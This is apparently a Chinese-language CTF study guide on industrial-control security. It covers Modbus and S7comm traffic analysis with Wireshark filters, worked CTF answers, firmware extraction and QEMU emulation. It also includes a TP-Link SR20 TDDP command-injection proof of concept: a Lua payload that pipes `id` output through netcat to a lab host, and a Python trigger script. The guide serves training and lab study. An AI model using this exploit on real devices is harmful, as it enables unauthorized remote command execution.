---
title: "CTF工控安全经验总结——从协议分析到固件逆向"
slug: "ctf-ics-security-guide"
date: "2026-07-21"
excerpt: "全面总结CTF工控安全（ICS/SCADA）类题目的核心考点和实战经验，涵盖工控协议分析、固件逆向与模拟、组态分析与常见漏洞"
---

## CTF工控安全经验总结——从协议分析到固件逆向

### 一、工控安全概述

工控安全（ICS Security）在 CTF 中的比重逐年增加，主要考察工业控制系统（ICS）与 SCADA（数据采集与监视控制）系统的协议分析、固件逆向、漏洞利用等能力。工控题目与传统的流量分析、逆向、PWN 均有交叉。

**核心能力要求：**
- 熟悉常见工控协议（Modbus、S7comm、DNP3、IEC 104、OPC UA 等）的帧结构与功能码
- 掌握工控流量分析（Wireshark 过滤、tshark 提取）
- 掌握固件提取与模拟（binwalk、firmadyne、QEMU）
- 了解工控系统常见漏洞类型与利用方式

**常见题型：**
1. 工控流量分析：从 PCAP 中提取异常流量、解码协议数据
2. 固件逆向：解包固件、提取文件系统、挖掘漏洞
3. 协议重放/伪造：构造协议报文触发异常
4. 组态分析：还原组态工程、梯形图逻辑

---

### 二、工控协议分析

#### 2.1 Modbus 协议

##### 2.1.1 协议概述

Modbus 是由 Modicon（现施耐德）于 1979 年发布的工业现场总线协议，是应用最广泛的工控协议之一。流量主要有三类：**Modbus/RTU**、**Modbus/ASCII**、**Modbus/TCP**。

| 类型 | 传输介质 | 端口 | 特点 |
|------|---------|------|------|
| Modbus/RTU | 串口（RS-232/485） | — | 二进制编码，效率高 |
| Modbus/ASCII | 串口 | — | ASCII 编码，便于调试 |
| Modbus/TCP | 以太网 | 502 | 基于 TCP，最常用于 CTF |

**Modbus/RTU 帧格式：**
```
从机地址 1B + 功能码 1B + 数据字段 xB + CRC值 2B
最大长度 256B，因此数据字段最大 252B
```

**Modbus/ASCII 帧格式：**
```
开始标记(:0x3A) 1B + 从机地址 2B + 功能码 2B + 数据字段 xB + LRC值 2B + 结束标记(\r\n) 2B
由 RTU 衍生，用 0-9 A-F 表示原本的从机地址、功能码、数据字段，长度翻倍
最大长度 513B（数据字段 RTU 最大 252B，ASCII 最大 504B）
```

**Modbus/TCP 帧格式：**
```
事务标识符 2B + 协议标识符 2B + 长度 2B + 单元标识符(UnitID) 1B + 功能码 1B + 数据字段 xB
不再需要从机地址（改用 UnitID）；不再需要 CRC/LRC（TCP 自带校验）
```

##### 2.1.2 功能码

CTF 中主要考察 Modbus/TCP 的功能码，解题时配合过滤器逐一看过去即可：

| 功能码 | 含义 |
|-------|------|
| 1 | 读线圈（Read Coils） |
| 2 | 读离散输入（Read Discrete Inputs） |
| 3 | 读保持寄存器（Read Holding Registers） |
| 4 | 读输入寄存器（Read Input Registers） |
| 5 | 写单个线圈（Write Single Coil） |
| 6 | 写单个保持寄存器（Write Single Register） |
| 15 | 写多个线圈（Write Multiple Coils） |
| 16 | 写多个保持寄存器（Write Multiple Registers） |

**异常流量定位思路：** 大部分流量都是正常的，异常流量一定是小部分。依次查看每个 `func_code`，根据字段排除正常流量。

例如：先查看 `(modbus) && (modbus.func_code == 17)`，发现大量 `modbus.data == 06:00:00` 的流量，则过滤：
```
((modbus) && (modbus.func_code == 17)) && !(modbus.data == 06:00:00)
```

依次过滤正常流量，最后剩下的就是异常流量。

##### 2.1.3 例题

**例题：HNGK-Modbus 流量分析**

直接使用过滤器即可得到 flag：
```
(((_ws.col.protocol == "Modbus/TCP") ) && (modbus.byte_cnt)) && (modbus.func_code == 16)
```
结果：`flag{TheModbusProtocolIsFunny!}`

**例题：HNGK-Modbus 协议分析**

流量包中 `modbus.func_code` 只有 2、3、4、16 四种。2 和 16 无异常，3 和 4 中寄存器的值存在异常：

- `func_code == 3` 的包中寄存器值一直在增加，最终写入内容
- `func_code == 4` 的包一直在读寄存器，内容和上面一致

因此逻辑是：3 先写入寄存器的值，4 再读取并发送。重点分析这段数据，因有不可见字符，复制为 Hex 格式：
```
(((modbus) && (modbus.func_code == 3)) && (ip.src == 192.168.161.2)) && (modbus.byte_cnt)
```

#### 2.2 S7comm 协议（西门子）

##### 2.2.1 协议概述

S7comm 是西门子 S7 系列 PLC 的通信协议，基于 COTP（ISO 8073，端口 102）实现，是 COTP 的上层协议。主要有三种类型：

| 类型 | 说明 |
|------|------|
| Job（1） | 下发任务/指令 |
| Ack_Data（3）/Ack（2） | 带有返回数据 / 单纯确认 |
| Userdata（7） | 用户自定义数据区，也包含功能指令 |

##### 2.2.2 例题

**例题1：2020ICSC 湖州站—工控协议数据分析**

过滤出 S7 协议数据包，发现一些 Ack_Data 数据包中传输了二进制数据；同时一些 Job 数据包中也有二进制数据。过滤并导出：
```
((s7comm) && (s7comm.resp.data)) && (s7comm.param.func == 0x05)
```
使用 tshark 提取数据：
```bash
tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq
```
最后用 CyberChef 解码二进制即可得到 flag。

**例题2：2020ICSC 济南站—被篡改的数据**

大量 S7COMM 数据包中 `s7comm.resp.data` 字段传了很多 `66` 数据。过滤出传了 `resp.data` 但数据不是 `66` 的 S7 数据包，发现疑似 flag 数据（防止 flag 中含 `f` 被过滤）：
```
(((frame.number >= 19987 && frame.number <= ...))) ...
```
tshark 提取后十六进制解码得到 `flag{93137ad4a}`。

**例题3：枢网智盾 2021—异常流分析**

大量 S7comm 流量，写入数据几乎都是 `ffff` 开头，直接查看不是 `ffff` 开头的数据：
```
((_ws.col.protocol == "S7COMM") && (s7comm.param.func == 0x05)) && (s7comm.resp.data[0:2] != ff:ff)
```
得到 `flag{ffad28a0ce69db34751f}`。

**例题4：枢网智盾 2021—工控协议分析**

```
(_ws.col.protocol == "S7COMM") && (frame.number == 418)
```
直接把明文传输的数据 base64 解码即可：`flag{hncome66!}`。

#### 2.3 其他常见工控协议

除 Modbus 与 S7comm 外，CTF 中还可能遇到以下协议：

| 协议 | 端口 | 说明 |
|------|------|------|
| DNP3 | 20000（TCP/UDP） | 分布式网络协议，电力系统常用 |
| IEC 60870-5-104 | 2404（TCP） | 电力远动协议，IEC 101 的网络版 |
| OPC UA | 4840（TCP） | 工业通信统一架构，带安全模型 |
| PROFINET | 34962 等 | 西门子工业以太网 |
| EtherNet/IP | 44818（TCP）/2222（UDP） | 基于 CIP 协议 |
| BACnet | 47808（UDP） | 楼宇自动化 |
| MQTT | 1883（TCP） | 物联网消息协议 |
| COTP / ISO 8073 | 102（TCP） | S7comm 的传输层基础 |

**通用分析思路：** 在 Wireshark 中按协议分层（`Statistics → Protocol Hierarchy`）识别协议类型，再针对功能码/寄存器字段逐个过滤，找出异常流量并导出数据解码。

---

### 三、工控固件分析

#### 3.1 固件提取

```bash
# 识别文件类型与内嵌文件系统
binwalk firmware.bin
# 递归提取
binwalk -Me firmware.bin
# 也可用 firmware-mod-kit（FMK）
./extract-firmware.sh firmware.bin
```

常见固件文件系统：SquashFS（`squashfs-root`）、CramFS、JFFS2、UBI 等。

#### 3.2 固件模拟（ARM QEMU）

工控固件多为 ARM/MIPS 架构，需用 QEMU 模拟运行以动态分析：

```bash
# 下载 ARM 模拟所需文件（Debian Wheezy ARM）
# debian_wheezy_armhf_standard.qcow2  —— 硬盘镜像
# initrd.img-3.2.0-4-vexpress         —— 初始 RAM 文件系统
# vmlinuz-3.2.0-4-vexpress            —— 内核镜像

# 创建虚拟网卡
sudo tunctl -t tap0 -u `whoami`
sudo ip link set tap0 up
sudo ifconfig tap0 10.10.10.1/24

# 启动 QEMU
qemu-system-arm \
    -M vexpress-a9 \
    -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2 console=ttyAMA0" \
    -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
```

虚拟机启动后（默认 root/root），配置网卡与宿主机通信：

```bash
ifconfig eth0 10.10.10.2/24
```

把固件文件系统传入虚拟机：

```bash
# 宿主机
tar -cjpf squashfs-root.tar.bz2 squashfs-root/
python -m http.server
# 虚拟机
wget http://10.10.10.1:8000/squashfs-root.tar.bz2
tar -xjpf squashfs-root.tar.bz2
```

#### 3.3 实例：TP-Link SR20 本地网络远程代码执行漏洞

**漏洞概述：** TP-Link SR20 路由器的 TDDP（TP-Link Device Debug Protocol）协议存在命令注入，攻击者可未认证执行任意命令（CVE-2019-12199 等）。

**固件获取：** 下载 SR20(US)_V1_180518，解压后用 binwalk 提取。

**漏洞复现要点：**

payload 文件（放入宿主机的 `/tftpboot` 目录）：
```lua
function config_test(config)
  os.execute("id | nc 10.10.10.1 1337")
end
```

poc.py（发送 TDDP 报文触发命令注入）：
```python
#!/usr/bin/python3
# Copyright 2019 Google LLC.
# SPDX-License-Identifier: Apache-2.0
import sys
import binascii
import socket

port_send = 1040
port_receive = 61000

tddp_ver = "01"
tddp_command = "31"
tddp_req = "01"
tddp_reply = "00"
tddp_padding = "%0.16X" % 00

tddp_packet = "".join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])

sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_receive.bind(('', port_receive))

sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = binascii.unhexlify(tddp_packet)
argument = "%s;arbitrary" % sys.argv[2]
packet = packet + argument.encode()
sock_send.sendto(packet, (sys.argv[1], port_send))
sock_send.close()

response, addr = sock_receive.recvfrom(1024)
r = response.encode('hex')
print(r)
```

---

### 四、工控编程与组态分析

工控组态题目要求选手还原上位机组态工程或梯形图逻辑，常用软件：

| 软件 | 用途 |
|------|------|
| McgsPro | 昆仑通态组态软件 |
| 组态王 | 亚控组态软件 |
| 西门子博图（TIA Portal） | 西门子 PLC 组态/编程 |
| STEP7 MicroWIN | 西门子 S7-200 编程 |

**分析要点：**
- 组态工程文件常为数据库或专有格式，可用相应软件打开查看变量表、画面、脚本
- 梯形图/语句表（STL）中可能内嵌逻辑，还原后提取 flag 或口令
- 关注工程文件中的加密配置、通信参数、配方数据

---

### 五、工控常见漏洞

| 漏洞类型 | 说明 |
|---------|------|
| 协议无认证/明文传输 | Modbus 等协议本身无认证与加密，可被中间人重放 |
| 弱口令/默认口令 | 上位机、PLC、HMI 默认凭证 |
| 远程代码执行 | 如 TP-Link SR20 TDDP 命令注入 |
| 固件后门 | 厂商预留后门账户或调试接口 |
| 组态软件漏洞 | 上位机组态软件的反序列化、文件解析漏洞 |
| Web 管理接口漏洞 | 工控设备 Web 界面 SQL 注入、命令注入等 |

---

### 六、工具速查表

| 工具 | 用途 |
|------|------|
| Wireshark | 工控流量分析（内置 Modbus/S7comm/DNP3 等解析） |
| tshark | 命令行提取协议字段 |
| binwalk | 固件识别与提取 |
| firmware-mod-kit | 固件解包 |
| QEMU | 固件 ARM/MIPS 模拟 |
| firmadyne | 固件模拟与分析框架 |
| CyberChef | 数据解码 |
| Ghidra/IDA | 固件二进制逆向 |

---

### 七、参考链接

- [Lunatic《Misc-工控安全》](https://goodlunatic.github.io/posts/01ebd40/)（本文主要来源）
- [Modbus 协议分析（CSDN）](https://blog.csdn.net/song123sh/article/details/128387982)
- [TP-Link SR20 本地网络 RCE 漏洞分析（Seebug）](https://paper.seebug.org/879/)
- [西门子 TIA 博途 V16 试用下载](https://support.industry.siemens.com/cs/document/109772803/)
- [Modbus 官方规范](https://modbus.org/)

